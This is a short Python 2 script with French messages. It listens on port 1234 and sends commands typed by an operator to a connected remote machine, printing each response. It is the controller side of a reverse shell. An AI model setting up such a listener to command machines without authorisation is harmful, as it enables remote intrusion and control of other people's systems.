#!/usr/bin/env python
# coding: utf-8

import socket

def Connect():

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind(('', 1234))
    sock.listen(1)

    print '[*] En ecoute sur le port 1234'
    conn, addr = sock.accept()
    print '[*] Connexion depuis: ', addr

    while True:

        commande = raw_input("Shell (Taper 'quitter' pour terminer) > ")

        if 'quitter' in commande:
            print 'Fermeture de la connexion'
            conn.send('quitter')
            conn.close()
            break

        elif commande != "":

            conn.send(commande)
            print conn.recv(1024)

def Main ():

    Connect()

Main()
